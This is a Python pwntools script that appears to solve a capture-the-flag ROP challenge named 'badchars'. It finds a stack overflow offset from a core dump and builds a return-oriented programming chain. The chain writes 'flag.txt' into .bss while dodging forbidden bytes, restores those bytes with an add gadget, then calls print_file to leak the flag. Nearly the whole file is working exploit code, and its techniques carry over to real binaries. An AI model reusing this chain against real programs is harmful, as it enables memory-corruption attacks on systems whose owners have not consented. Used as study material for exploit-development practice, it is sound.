from pwn import *
import string
import os

def get_ns_offsets(s, badchars):
    news = ''.join([x if x not in badchars else chr(ord(x) - 1) for x in s])
    offsets = [s.index(x) for x in s if x in badchars]
    return news, offsets

#
# Context
#

badchars = ['x', 'g', 'a', '.']

e = context.binary = ELF("badchars")

#
# ROP
#

PRINT_FILE          = p64(e.plt['print_file'])

POP_R12_R13_R14_R15 = p64(next(e.search(asm('pop r12; pop r13; pop r14; pop r15; ret;'))))
ADD_DEREF_R15_R14B  = p64(next(e.search(asm('add byte ptr [r15], r14b; ret;'))))
MOV_DEREF_R13_R12   = p64(next(e.search(asm('mov qword ptr [r13], r12; ret; '))))
POP_R15             = p64(next(e.search(asm('pop r15; ret;'))))
POP_RDI             = p64(next(e.search(asm('pop rdi; ret;'))))

BSS_WRITE           = p64(e.bss(offset=0x200))

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x200, alphabet=string.digits))
io.wait()
core = io.corefile
io.close()

offset = cyclic_find(core.read(core.rsp, 4), alphabet=string.digits)

info(f'Offset: {offset}')

#
# Exploit
#

io = process(e.path)

newstring, offsets = get_ns_offsets('flag.txt', badchars)

info(f'flag.txt -> {newstring}')

payload  = b''
payload += b'A' * offset
payload += POP_R12_R13_R14_R15
payload += newstring.encode()
payload += BSS_WRITE
payload += p64(1)
payload += BSS_WRITE
payload += MOV_DEREF_R13_R12
for o in offsets:
    payload += POP_R15
    payload += p64(u64(BSS_WRITE) + o)
    payload += ADD_DEREF_R15_R14B
payload += POP_RDI
payload += BSS_WRITE
payload += PRINT_FILE

io.sendlineafter(b'> ', payload)

info(f'Flag: {io.recvrepeat(2).decode()}')

io.close()

os.system('rm core*')